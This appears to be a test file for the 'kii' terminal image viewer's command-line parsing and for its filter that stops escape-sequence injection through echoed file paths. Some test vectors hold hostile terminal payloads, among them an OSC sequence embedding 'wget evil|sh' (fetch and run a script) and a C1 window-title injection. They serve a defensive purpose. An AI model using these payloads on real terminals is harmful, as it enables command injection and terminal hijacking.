# kii — CLI surface tests (standalone).
#
# Post-PNG-re-fold split of the old monolithic tests/kii.tcyr. Covers
# the M1 flag-parse wiring (cmdit) + M1(c) kii_validate_color predicate
# + M7(c) kii_path_has_control_bytes ANSI-injection defense. Pure
# in-process — no PNG decode surface here.
#
# Stdlib + the cmdit dist auto-resolve from cyrius.cyml; only the
# project module + the assert harness are included explicitly.

include "src/cli.cyr"
include "lib/assert.cyr"

# kii_err_flag_name returns 0 for "no flag named", and assert_streq would
# fault on 0. Check it is set first, so a regression fails as a verdict
# rather than a SIGSEGV that never reaches one.
fn _assert_flag_name(fs, want, label): i64 {
    var nm = kii_err_flag_name(fs);
    assert_neq(nm, 0, label);
    if (nm != 0) { assert_streq(nm, want, label); }
    return 0;
}

fn main() {
    alloc_init();

    # ---- smoke ------------------------------------------------------
    test_group("smoke");
    assert(1, "true is true");
    assert_eq(1 + 1, 2, "math works");

    # ---- M1(c): kii_validate_color predicate ------------------------
    # Tier-1 scope is 8 / 16 only; 256 / truecolor are post-v1 per
    # CLAUDE.md color-tier discipline. Locks the boundary in code so
    # any future change that quietly admits other values regresses
    # this test before the milestone gate.
    test_group("M1 — kii_validate_color");
    assert_eq(kii_validate_color(8),   1, "--color 8 valid");
    assert_eq(kii_validate_color(16),  1, "--color 16 valid");
    assert_eq(kii_validate_color(0),   0, "--color 0 rejected");
    assert_eq(kii_validate_color(7),   0, "--color 7 rejected");
    assert_eq(kii_validate_color(15),  0, "--color 15 rejected (off-by-one of 16)");
    assert_eq(kii_validate_color(17),  0, "--color 17 rejected (off-by-one of 16)");
    assert_eq(kii_validate_color(256), 0, "--color 256 rejected (tier-2, post-v1)");
    assert_eq(kii_validate_color(0 - 1), 0, "--color -1 rejected");

    # ---- 1.3.0: kii_validate_mode + kii_mode_is_ascii ----------------
    test_group("1.3.0 — kii_validate_mode / kii_mode_is_ascii");
    assert_eq(kii_validate_mode("halfblock"), 1, "halfblock valid");
    assert_eq(kii_validate_mode("ascii"),     1, "ascii valid");
    assert_eq(kii_validate_mode("bogus"),     0, "bogus rejected");
    assert_eq(kii_validate_mode(""),          0, "empty rejected");
    assert_eq(kii_mode_is_ascii("ascii"),     1, "ascii -> is_ascii");
    assert_eq(kii_mode_is_ascii("halfblock"), 0, "halfblock -> not ascii");

    # ---- M1(a)(b)(c): flag-parse happy paths ------------------------
    # Each case builds a synthetic argv, registers kii's flag set into a
    # cmdit context, parses (the pure cmdit_parse_argv core — no /proc),
    # and reads back the captured values. cmdit's parser is unit-tested in
    # its own tests/cmdit.tcyr; here we verify kii's wiring (short codes,
    # defaults, value extraction). cmdit_new auto-registers --help/-h +
    # --version/-V, so those runs return CMDIT_HELP / CMDIT_VERSION rather
    # than setting a kii-tracked flag. width/color/verbose keep indices 2/3/4.

    test_group("M1 — --help long form -> CMDIT_HELP");
    var fs1 = cmdit_new("kii");
    kii_register_flags(fs1);
    var argv1[16];
    store64(&argv1 + 0, "kii");
    store64(&argv1 + 8, "--help");
    assert_eq(cmdit_parse_argv(fs1, 2, &argv1), CMDIT_HELP, "--help -> CMDIT_HELP");
    assert_eq(cmdit_get_int (fs1, KII_F_WIDTH),   0, "--width default (0 = match terminal)");
    assert_eq(cmdit_get_int (fs1, KII_F_COLOR),  16, "--color default 16");

    test_group("M1 — -V short form -> CMDIT_VERSION");
    var fs2 = cmdit_new("kii");
    kii_register_flags(fs2);
    var argv2[16];
    store64(&argv2 + 0, "kii");
    store64(&argv2 + 8, "-V");
    assert_eq(cmdit_parse_argv(fs2, 2, &argv2), CMDIT_VERSION, "-V -> CMDIT_VERSION");

    test_group("M1 — --width N + --color N (long forms)");
    var fs3 = cmdit_new("kii");
    kii_register_flags(fs3);
    var argv3[64];
    store64(&argv3 + 0,  "kii");
    store64(&argv3 + 8,  "--width");
    store64(&argv3 + 16, "120");
    store64(&argv3 + 24, "--color");
    store64(&argv3 + 32, "8");
    store64(&argv3 + 40, "photo.png");
    assert_eq(cmdit_parse_argv(fs3, 6, &argv3), CMDIT_OK, "--width 120 --color 8 photo.png parses clean");
    assert_eq(cmdit_get_int(fs3, KII_F_WIDTH), 120, "--width extracted = 120");
    assert_eq(cmdit_get_int(fs3, KII_F_COLOR), 8,   "--color extracted = 8");
    assert_eq(cmdit_positional_count(fs3), 1, "one positional captured");

    test_group("M1 — -w N + -c N (short forms)");
    var fs4 = cmdit_new("kii");
    kii_register_flags(fs4);
    var argv4[64];
    store64(&argv4 + 0,  "kii");
    store64(&argv4 + 8,  "-w");
    store64(&argv4 + 16, "60");
    store64(&argv4 + 24, "-c");
    store64(&argv4 + 32, "16");
    store64(&argv4 + 40, "img.png");
    assert_eq(cmdit_parse_argv(fs4, 6, &argv4), CMDIT_OK, "-w 60 -c 16 img.png parses clean");
    assert_eq(cmdit_get_int(fs4, KII_F_WIDTH), 60, "-w extracted = 60");
    assert_eq(cmdit_get_int(fs4, KII_F_COLOR), 16, "-c extracted = 16");

    test_group("M1 — --width=N attached syntax");
    var fs5 = cmdit_new("kii");
    kii_register_flags(fs5);
    var argv5[24];
    store64(&argv5 + 0,  "kii");
    store64(&argv5 + 8,  "--width=80");
    store64(&argv5 + 16, "img.png");
    assert_eq(cmdit_parse_argv(fs5, 3, &argv5), CMDIT_OK, "--width=80 parses clean");
    assert_eq(cmdit_get_int(fs5, KII_F_WIDTH), 80, "--width=80 extracted");

    # ---- M1(d) — malformed-arg error variants -----------------------
    # Each CmditErr the parser can emit is reachable from a plausible
    # invocation. Locking the variant codes here means a cmdit refactor
    # trips this test before kii silently mis-routes its error messages.

    test_group("M1(d) — error: unknown flag");
    var fs6 = cmdit_new("kii");
    kii_register_flags(fs6);
    var argv6[16];
    store64(&argv6 + 0, "kii");
    store64(&argv6 + 8, "--bogus");
    assert_eq(cmdit_parse_argv(fs6, 2, &argv6), CMDIT_RESULT_ERR, "--bogus rejected");
    assert_eq(cmdit_error(fs6), CMDIT_ERR_UNKNOWN, "error = UNKNOWN");

    test_group("M1(d) — error: missing int value");
    var fs7 = cmdit_new("kii");
    kii_register_flags(fs7);
    var argv7[16];
    store64(&argv7 + 0, "kii");
    store64(&argv7 + 8, "--width");          # no value follows
    assert_eq(cmdit_parse_argv(fs7, 2, &argv7), CMDIT_RESULT_ERR, "--width without value rejected");
    assert_eq(cmdit_error(fs7), CMDIT_ERR_MISSING_VALUE, "error = MISSING_VALUE");

    test_group("M1(d) — error: bad integer value");
    var fs8 = cmdit_new("kii");
    kii_register_flags(fs8);
    var argv8[32];
    store64(&argv8 + 0,  "kii");
    store64(&argv8 + 8,  "--width");
    store64(&argv8 + 16, "abc");
    store64(&argv8 + 24, "img.png");
    assert_eq(cmdit_parse_argv(fs8, 4, &argv8), CMDIT_RESULT_ERR, "--width abc rejected");
    assert_eq(cmdit_error(fs8), CMDIT_ERR_BAD_INT, "error = BAD_INT");

    test_group("M1(d) — error: bundled short flags");
    var fs9 = cmdit_new("kii");
    kii_register_flags(fs9);
    var argv9[16];
    store64(&argv9 + 0, "kii");
    store64(&argv9 + 8, "-hV");              # bundled — not supported
    assert_eq(cmdit_parse_argv(fs9, 2, &argv9), CMDIT_RESULT_ERR, "-hV bundled rejected");
    assert_eq(cmdit_error(fs9), CMDIT_ERR_BUNDLED, "error = BUNDLED");
    assert_eq(kii_err_flag_name(fs9), 0, "BUNDLED names no flag");

    # ---- v1.6.2 — a bool flag given `=value` (cmdit 1.3.1) -----------
    # Through cmdit 1.2.5 `--verbose=0` parsed as verbose ON. cmdit 1.3.1
    # refuses it with UNEXPECTED_VALUE, and kii names the flag. Only the
    # long forms reach the code: the short `-v=1` is BUNDLED.
    test_group("v1.6.2 — error: --verbose=0 is UNEXPECTED_VALUE, naming --verbose");
    var fs11 = cmdit_new("kii");
    kii_register_flags(fs11);
    var argv11[24];
    store64(&argv11 + 0,  "kii");
    store64(&argv11 + 8,  "--verbose=0");
    store64(&argv11 + 16, "img.png");
    assert_eq(cmdit_parse_argv(fs11, 3, &argv11), CMDIT_RESULT_ERR, "--verbose=0 rejected");
    assert_eq(cmdit_error(fs11), CMDIT_ERR_UNEXPECTED_VALUE, "error = UNEXPECTED_VALUE");
    _assert_flag_name(fs11, "verbose", "names verbose");
    assert_eq(cmdit_get_bool(fs11, KII_F_VERBOSE), 0, "verbose not switched on");

    test_group("v1.6.2 — error: every bool long form given =value names its flag");
    var fs12 = cmdit_new("kii");
    kii_register_flags(fs12);
    var argv12[16];
    store64(&argv12 + 0, "kii");
    store64(&argv12 + 8, "--verbose=");     # an empty value is still a value
    assert_eq(cmdit_parse_argv(fs12, 2, &argv12), CMDIT_RESULT_ERR, "--verbose= rejected");
    assert_eq(cmdit_error(fs12), CMDIT_ERR_UNEXPECTED_VALUE, "--verbose= → UNEXPECTED_VALUE");
    _assert_flag_name(fs12, "verbose", "--verbose= names verbose");
    var fs13 = cmdit_new("kii");
    kii_register_flags(fs13);
    var argv13[16];
    store64(&argv13 + 0, "kii");
    store64(&argv13 + 8, "--help=x");
    assert_eq(cmdit_parse_argv(fs13, 2, &argv13), CMDIT_RESULT_ERR, "--help=x rejected, not help");
    assert_eq(cmdit_error(fs13), CMDIT_ERR_UNEXPECTED_VALUE, "--help=x → UNEXPECTED_VALUE");
    _assert_flag_name(fs13, "help", "--help=x names help");
    var fs14 = cmdit_new("kii");
    kii_register_flags(fs14);
    var argv14[16];
    store64(&argv14 + 0, "kii");
    store64(&argv14 + 8, "--version=1");
    assert_eq(cmdit_parse_argv(fs14, 2, &argv14), CMDIT_RESULT_ERR, "--version=1 rejected, not version");
    assert_eq(cmdit_error(fs14), CMDIT_ERR_UNEXPECTED_VALUE, "--version=1 → UNEXPECTED_VALUE");
    _assert_flag_name(fs14, "version", "--version=1 names version");

    test_group("v1.6.2 — the short form and value flags are not UNEXPECTED_VALUE");
    var fs15 = cmdit_new("kii");
    kii_register_flags(fs15);
    var argv15[16];
    store64(&argv15 + 0, "kii");
    store64(&argv15 + 8, "-v=1");
    assert_eq(cmdit_parse_argv(fs15, 2, &argv15), CMDIT_RESULT_ERR, "-v=1 rejected");
    assert_eq(cmdit_error(fs15), CMDIT_ERR_BUNDLED, "-v=1 → BUNDLED");
    var fs16 = cmdit_new("kii");
    kii_register_flags(fs16);
    var argv16[32];
    store64(&argv16 + 0,  "kii");
    store64(&argv16 + 8,  "--width=5");
    store64(&argv16 + 16, "--mode=ascii");
    store64(&argv16 + 24, "img.png");
    assert_eq(cmdit_parse_argv(fs16, 4, &argv16), CMDIT_OK, "--width=5 --mode=ascii parse clean");
    assert_eq(cmdit_get_int(fs16, KII_F_WIDTH), 5, "--width=5 → 5");
    var fs17 = cmdit_new("kii");
    kii_register_flags(fs17);
    var argv17[16];
    store64(&argv17 + 0, "kii");
    store64(&argv17 + 8, "--bogus");
    assert_eq(cmdit_parse_argv(fs17, 2, &argv17), CMDIT_RESULT_ERR, "--bogus rejected");
    assert_eq(kii_err_flag_name(fs17), 0, "UNKNOWN names no flag");

    # ---- v1.6.4 — the --width check and the frame-size cap ------------
    # P(-1): `--width -5` used to mean "fit the terminal" and exit 0, and a
    # narrow image at an ordinary --width produced gigabytes (S-1).
    test_group("v1.6.4 — kii_width_error_line");
    assert_eq(kii_width_error_line(0), 0, "0 (fit the terminal) is fine");
    assert_eq(kii_width_error_line(1), 0, "1 is fine");
    assert_eq(kii_width_error_line(KII_MAX_COLS), 0, "the maximum itself is fine");
    assert_eq(KII_MAX_COLS, 100000, "KII_MAX_COLS is the 100000 the message quotes");
    assert_streq(kii_width_error_line(KII_MAX_COLS + 1),
      "kii: --width exceeds the maximum of 100000 columns\n", "past the maximum");
    assert_streq(kii_width_error_line(0 - 5),
      "kii: --width must not be negative (0 = fit the terminal)\n", "-5 is refused");
    assert_streq(kii_width_error_line(0 - 100000000000),
      "kii: --width must not be negative (0 = fit the terminal)\n", "a huge negative is refused");

    test_group("v1.6.4 — kii_frame_cells_ok bounds the frame");
    assert_eq(KII_MAX_CELLS, 1048576, "KII_MAX_CELLS is the 1048576 main's message quotes");
    assert_eq(kii_frame_cells_ok(80, 24), 1, "80x24 is fine");
    assert_eq(kii_frame_cells_ok(1024, 1024), 1, "1024x1024 is exactly the cap");
    assert_eq(kii_frame_cells_ok(1024, 1025), 0, "one row past the cap is refused");
    assert_eq(kii_frame_cells_ok(1048576, 1), 1, "a 1-row frame of the full cap");
    assert_eq(kii_frame_cells_ok(1048577, 1), 0, "wider than the cap is refused");
    # The same image at --width 8: 262,140 rows x 8 = 2,097,120 cells.
    assert_eq(kii_frame_cells_ok(8, 262140), 0, "1x65535 at --width 8 is refused too");
    # The S-1 reproduction: a 1x65535 image at --width 80 asks for
    # 65535 * 80 / 2 = 2,621,400 rows.
    assert_eq(kii_frame_cells_ok(80, 2621400), 0, "1x65535 at --width 80 is refused");
    assert_eq(kii_frame_cells_ok(0, 5), 0, "0 columns is refused");
    assert_eq(kii_frame_cells_ok(5, 0), 0, "0 rows is refused");
    assert_eq(kii_frame_cells_ok(4611686018427387904, 4611686018427387904), 0,
      "no overflow at 2^62 x 2^62");

    test_group("v1.6.4 — --mode / -m parse and default");
    var fs18 = cmdit_new("kii");
    kii_register_flags(fs18);
    var argv18[32];
    store64(&argv18 + 0,  "kii");
    store64(&argv18 + 8,  "-m");
    store64(&argv18 + 16, "ascii");
    store64(&argv18 + 24, "img.png");
    assert_eq(cmdit_parse_argv(fs18, 4, &argv18), CMDIT_OK, "-m ascii parses");
    assert_streq(cmdit_get_str(fs18, KII_F_MODE), "ascii", "-m ascii → ascii");
    var fs19 = cmdit_new("kii");
    kii_register_flags(fs19);
    var argv19[16];
    store64(&argv19 + 0, "kii");
    store64(&argv19 + 8, "img.png");
    assert_eq(cmdit_parse_argv(fs19, 2, &argv19), CMDIT_OK, "no --mode parses");
    assert_streq(cmdit_get_str(fs19, KII_F_MODE), "halfblock", "--mode defaults to halfblock");

    # ---- v1.6.2 — kii_parse_error_line: the exact stderr bytes --------
    # The four pre-1.6.2 lines are byte-identical to what main printed
    # inline through v1.6.1.
    test_group("v1.6.2 — kii_parse_error_line: one line per reachable code");
    assert_streq(kii_parse_error_line(CMDIT_ERR_UNKNOWN), "kii: unknown flag\n", "UNKNOWN");
    assert_streq(kii_parse_error_line(CMDIT_ERR_MISSING_VALUE), "kii: flag missing value\n", "MISSING_VALUE");
    assert_streq(kii_parse_error_line(CMDIT_ERR_BAD_INT), "kii: bad integer value\n", "BAD_INT");
    assert_streq(kii_parse_error_line(CMDIT_ERR_BUNDLED),
                 "kii: short flags take no attached value and cannot be bundled (use -w 40 -v, not -w40 or -wv)\n", "BUNDLED");
    assert_streq(kii_parse_error_line(CMDIT_ERR_UNEXPECTED_VALUE), "kii: flag takes no value\n",
                 "UNEXPECTED_VALUE fallback (no flag named)");
    assert_streq(kii_parse_error_line(CMDIT_ERR_NOMEM), "kii: out of memory\n", "NOMEM");
    assert_streq(kii_parse_error_line(CMDIT_ERR_ARGV), "kii: could not read the full command line\n", "ARGV");

    test_group("v1.6.2 — kii_parse_error_line: unreachable codes keep the generic line");
    assert_streq(kii_parse_error_line(CMDIT_ERR_NONE), "kii: argument parse error\n", "NONE");
    assert_streq(kii_parse_error_line(CMDIT_ERR_REQUIRED_MISSING), "kii: argument parse error\n", "REQUIRED_MISSING");
    assert_streq(kii_parse_error_line(CMDIT_ERR_BAD_ENUM), "kii: argument parse error\n", "BAD_ENUM");
    assert_streq(kii_parse_error_line(CMDIT_ERR_OUT_OF_RANGE), "kii: argument parse error\n", "OUT_OF_RANGE");
    assert_streq(kii_parse_error_line(CMDIT_ERR_UNKNOWN_VERB), "kii: argument parse error\n", "UNKNOWN_VERB");
    assert_streq(kii_parse_error_line(CMDIT_ERR_MISSING_POSITIONAL), "kii: argument parse error\n", "MISSING_POSITIONAL");
    assert_streq(kii_parse_error_line(CMDIT_ERR_TOO_MANY_POSITIONAL), "kii: argument parse error\n", "TOO_MANY_POSITIONAL");
    assert_streq(kii_parse_error_line(CMDIT_ERR_REPEATED), "kii: argument parse error\n", "REPEATED");
    assert_streq(kii_parse_error_line(99), "kii: argument parse error\n", "a code past the taxonomy");

    # cmdit_new returns 0 when alloc refuses; cmdit 1.3.2 makes every entry
    # point accept that handle and report NOMEM, so main's path stays sound.
    test_group("v1.6.2 — a 0 handle (cmdit_new OOM) reports NOMEM and names no flag");
    assert_eq(cmdit_error(0), CMDIT_ERR_NOMEM, "cmdit_error(0) = NOMEM");
    assert_eq(kii_err_flag_name(0), 0, "kii_err_flag_name(0) = 0");
    assert_streq(kii_parse_error_line(cmdit_error(0)), "kii: out of memory\n", "0 handle → out of memory line");

    # ---- M1(d) — positional accumulation ----------------------------
    # Two-positional case is a usage error in main.cyr's dispatch but
    # cmdit_parse itself accepts it (and stashes them both). Locks the
    # "kii sees N positionals" view that the dispatch branches on.
    test_group("M1(d) — multiple positionals captured (dispatched as usage error in main)");
    var fs10 = cmdit_new("kii");
    kii_register_flags(fs10);
    var argv10[32];
    store64(&argv10 + 0,  "kii");
    store64(&argv10 + 8,  "a.png");
    store64(&argv10 + 16, "b.png");
    assert_eq(cmdit_parse_argv(fs10, 3, &argv10), CMDIT_OK, "a.png b.png parses clean");
    assert_eq(cmdit_positional_count(fs10), 2, "two positionals captured");

    # ---- M7(c) Finding 6: stderr path-echo ANSI-injection defense ----
    # kii_path_has_control_bytes is the pure predicate behind
    # _eprint_path_safe in main.cyr — returns 1 if the path contains
    # any byte that must NOT be emitted to a terminal-attached fd.
    # See docs/audit/2026-05-22-audit.md § Finding 6.
    test_group("M7(c) — kii_path_has_control_bytes: safe paths");
    assert_eq(kii_path_has_control_bytes(""),                   0, "empty path → safe");
    assert_eq(kii_path_has_control_bytes("image.png"),          0, "plain ASCII → safe");
    assert_eq(kii_path_has_control_bytes("/tmp/image.png"),     0, "absolute path → safe");
    assert_eq(kii_path_has_control_bytes("a b c.png"),          0, "spaces → safe");
    assert_eq(kii_path_has_control_bytes("./../image.png"),     0, "relative path → safe");
    # UTF-8 paths must pass through — AGNOS naming uses Hawaiian,
    # Sanskrit, East-Asian characters whose continuation bytes land
    # in 0x80–0xBF. "kiʻi" itself contains U+02BB = 0xCA 0xBB.
    assert_eq(kii_path_has_control_bytes("kiʻi.png"),           0, "UTF-8 (Hawaiian ʻokina) → safe");
    assert_eq(kii_path_has_control_bytes("画像.png"),            0, "UTF-8 (CJK) → safe");
    assert_eq(kii_path_has_control_bytes("чёрный.png"),         0, "UTF-8 (Cyrillic) → safe");
    # Tab and LF are explicitly allowed per the coreutils-`ls`
    # convention (LF-in-filename is filesystem-legal but rare;
    # TAB-in-filename is more common, e.g. accidental shell paste).
    assert_eq(kii_path_has_control_bytes("a\tb.png"),           0, "TAB → safe (allow-listed)");
    assert_eq(kii_path_has_control_bytes("a\nb.png"),           0, "LF → safe (allow-listed)");

    test_group("M7(c) — kii_path_has_control_bytes: injection vectors");
    # ESC (0x1B) is the universal ANSI-injection lead byte. Any
    # path containing it must be suppressed.
    assert_eq(kii_path_has_control_bytes("\x1bfoo.png"),        1, "ESC → unsafe");
    assert_eq(kii_path_has_control_bytes("foo\x1b.png"),        1, "ESC mid-path → unsafe");
    # CVE-2021-25743 analog: malicious filename carrying an OSC
    # window-title-set + DECRQSS query that would hijack the
    # terminal if echoed raw.
    assert_eq(kii_path_has_control_bytes("/tmp/\x1b]2;wget evil|sh\x07.png"), 1,
      "CVE-2021-25743 OSC-injection attack path → unsafe");
    # BEL (0x07) is the OSC string terminator — another injection
    # primitive.
    assert_eq(kii_path_has_control_bytes("foo\x07.png"),        1, "BEL → unsafe");
    # DEL (0x7F) is the C0 trailer — never a legitimate filename byte.
    assert_eq(kii_path_has_control_bytes("foo\x7f.png"),        1, "DEL → unsafe");
    # NUL is technically not reachable through strlen (terminates
    # the C-string), but every other C0 control should trip the
    # predicate. Sample a few representative ones.
    assert_eq(kii_path_has_control_bytes("a\x01b"),             1, "SOH (0x01) → unsafe");
    assert_eq(kii_path_has_control_bytes("a\x08b"),             1, "BS (0x08) → unsafe");
    assert_eq(kii_path_has_control_bytes("a\x0bb"),             1, "VT (0x0B) → unsafe");
    assert_eq(kii_path_has_control_bytes("a\x0cb"),             1, "FF (0x0C) → unsafe");
    assert_eq(kii_path_has_control_bytes("a\x0db"),             1, "CR (0x0D) → unsafe");
    assert_eq(kii_path_has_control_bytes("a\x1fb"),             1, "US (0x1F) → unsafe");
    # Boundary: 0x20 (SPACE) is the first printable byte; must NOT trip.
    assert_eq(kii_path_has_control_bytes("a\x20b"),             0, "SPACE (0x20) → safe (boundary)");
    # Boundary: 0x7E (~) is the last 7-bit printable byte; must NOT trip.
    assert_eq(kii_path_has_control_bytes("a\x7eb"),             0, "TILDE (0x7E) → safe (boundary)");
    # Boundary: 0x80. SUPERSEDED at the v1.5.1 P-1 sweep — this used to
    # assert `safe`, on the stated grounds that "the audit doc's initial
    # recommendation to reject 0x80–0x9F was relaxed for UTF-8 ergonomics".
    # That relaxation rested on a false premise: a bare 0x80 has no lead byte,
    # so it is not valid UTF-8 in the first place and no legitimate filename
    # produces it. Meanwhile 0x80–0x9F IS the C1 control range, and a terminal
    # in 8-bit mode reads 0x9B as CSI and 0x9D as OSC — so the "ergonomic"
    # relaxation was the entire ANSI-injection hole. The predicate now walks
    # UTF-8 structure instead of testing a flat range, which rejects stray C1
    # bytes while passing every real multi-byte sequence (asserted above).
    assert_eq(kii_path_has_control_bytes("a\x80b"),             1, "0x80 (stray C1 / bare continuation) → unsafe");

    test_group("P-1 (v1.5.1) — C1 control bytes in both encodings");
    # 8-bit-mode C1 introducers: the exact twins of the C0 sequences above.
    assert_eq(kii_path_has_control_bytes("a\x9Bb"),             1, "0x9B (C1 CSI) → unsafe");
    assert_eq(kii_path_has_control_bytes("a\x9Db"),             1, "0x9D (C1 OSC) → unsafe");
    assert_eq(kii_path_has_control_bytes("a\x90b"),             1, "0x90 (C1 DCS) → unsafe");
    assert_eq(kii_path_has_control_bytes("a\x9Cb"),             1, "0x9C (C1 ST) → unsafe");
    # The full OSC window-title injection that reached stderr byte-for-byte
    # before this fix — the C1 spelling of the CVE-2021-25743 analog above.
    assert_eq(kii_path_has_control_bytes("\x9D0;PWNED\x9C.png"), 1,
      "C1 OSC window-title injection → unsafe");
    # UTF-8-ENCODED C1: C2 80..C2 9F decodes to U+0080..U+009F, which a UTF-8
    # terminal may honour. Catching only the raw form would leave this open.
    assert_eq(kii_path_has_control_bytes("a\xC2\x9Bb"),          1, "C2 9B (UTF-8-encoded CSI) → unsafe");
    assert_eq(kii_path_has_control_bytes("a\xC2\x80b"),          1, "C2 80 (UTF-8-encoded C1 low) → unsafe");
    assert_eq(kii_path_has_control_bytes("a\xC2\x9Fb"),          1, "C2 9F (UTF-8-encoded C1 high) → unsafe");
    # ...but C2 A0 (U+00A0 NBSP) is past the C1 block and stays safe — the
    # guard must not swallow the rest of Latin-1 Supplement.
    assert_eq(kii_path_has_control_bytes("a\xC2\xA0b"),          0, "C2 A0 (U+00A0 NBSP) → safe");
    assert_eq(kii_path_has_control_bytes("caf\xC3\xA9.png"),     0, "C3 A9 (é) → safe");
    # Malformed UTF-8 is refused: if we cannot tell what the terminal will do
    # with the bytes, we do not echo them.
    assert_eq(kii_path_has_control_bytes("a\xC3"),              1, "truncated 2-byte sequence → unsafe");
    assert_eq(kii_path_has_control_bytes("a\xE7\x94"),           1, "truncated 3-byte sequence → unsafe");
    assert_eq(kii_path_has_control_bytes("a\xFFb"),             1, "0xFF (never valid UTF-8) → unsafe");
    assert_eq(kii_path_has_control_bytes("a\xC0\x80b"),          1, "C0 80 (overlong NUL) → unsafe");

    test_group("v1.6.0 — strict RFC 3629 via darshana tty_has_ctl");
    # The deliberate tightening the swap to darshana's predicate brings: kii's
    # own walk checked only that continuation bytes were 0x80-0xBF, so it
    # accepted the four second-byte ranges RFC 3629 § 4 forbids. Each refused
    # form sits beside the valid code point at its boundary, which must still
    # pass.
    # Overlong 3-byte (E0 80-9F ..) — including the overlong spelling of C1 CSI.
    assert_eq(kii_path_has_control_bytes("a\xE0\x80\x80b"),      1, "E0 80 80 (overlong 3-byte) → unsafe");
    assert_eq(kii_path_has_control_bytes("a\xE0\x9F\xBFb"),      1, "E0 9F BF (last overlong 3-byte) → unsafe");
    assert_eq(kii_path_has_control_bytes("a\xE0\x82\x9Bb"),      1, "E0 82 9B (overlong U+009B CSI) → unsafe");
    assert_eq(kii_path_has_control_bytes("a\xE0\x80\x9Bb"),      1, "E0 80 9B (overlong U+001B ESC) → unsafe");
    assert_eq(kii_path_has_control_bytes("a\xE0\xA0\x80b"),      0, "E0 A0 80 (U+0800, first 3-byte) → safe");
    # UTF-16 surrogates (ED A0-BF ..).
    assert_eq(kii_path_has_control_bytes("a\xED\xA0\x80b"),      1, "ED A0 80 (U+D800 surrogate) → unsafe");
    assert_eq(kii_path_has_control_bytes("a\xED\xBF\xBFb"),      1, "ED BF BF (U+DFFF surrogate) → unsafe");
    assert_eq(kii_path_has_control_bytes("a\xED\x9F\xBFb"),      0, "ED 9F BF (U+D7FF, below surrogates) → safe");
    # Overlong 4-byte (F0 80-8F ..) — including the 4-byte overlong CSI.
    assert_eq(kii_path_has_control_bytes("a\xF0\x80\x80\x80b"),  1, "F0 80 80 80 (overlong 4-byte) → unsafe");
    assert_eq(kii_path_has_control_bytes("a\xF0\x8F\xBF\xBFb"),  1, "F0 8F BF BF (last overlong 4-byte) → unsafe");
    assert_eq(kii_path_has_control_bytes("a\xF0\x80\x82\x9Bb"),  1, "F0 80 82 9B (4-byte overlong CSI) → unsafe");
    assert_eq(kii_path_has_control_bytes("a\xF0\x90\x80\x80b"),  0, "F0 90 80 80 (U+10000, first 4-byte) → safe");
    # Past U+10FFFF (F4 90-BF .., and every F5-FF lead).
    assert_eq(kii_path_has_control_bytes("a\xF4\x90\x80\x80b"),  1, "F4 90 80 80 (U+110000) → unsafe");
    assert_eq(kii_path_has_control_bytes("a\xF4\x8F\xBF\xBFb"),  0, "F4 8F BF BF (U+10FFFF, the last code point) → safe");
    assert_eq(kii_path_has_control_bytes("a\xF5\x80\x80\x80b"),  1, "F5 lead → unsafe");
    # Ordinary text across all four lengths still passes untouched.
    assert_eq(kii_path_has_control_bytes("a\xEF\xBF\xBFb"),      0, "EF BF BF (U+FFFF) → safe");
    assert_eq(kii_path_has_control_bytes("\xF0\x9F\x98\x80.png"), 0, "F0 9F 98 80 (emoji) → safe");
    assert_eq(kii_path_has_control_bytes("ka\xCA\xBBi \xE7\x94\xBB \xF0\x9F\x98\x80.png"), 0,
      "mixed 2/3/4-byte name → safe");
    # The predicate is darshana's, with kii's arguments; check it is wired to
    # them (UTF-8 mode, TAB + LF kept) rather than to LATIN1 or no keep bits.
    assert_eq(tty_has_ctl("a\tb", 3, TTY_SANITIZE_UTF8, TTY_KEEP_TAB | TTY_KEEP_LF),
      kii_path_has_control_bytes("a\tb"), "TAB: same verdict as tty_has_ctl(UTF8, TAB|LF)");
    assert_eq(tty_has_ctl("\xC3\xA9", 2, TTY_SANITIZE_UTF8, TTY_KEEP_TAB | TTY_KEEP_LF),
      kii_path_has_control_bytes("\xC3\xA9"), "é: same verdict as tty_has_ctl(UTF8, TAB|LF)");
    assert_eq(kii_path_has_control_bytes(""),                     0, "empty path → safe");

    return assert_summary();
}

var exit_code = main();
syscall(SYS_EXIT, exit_code);
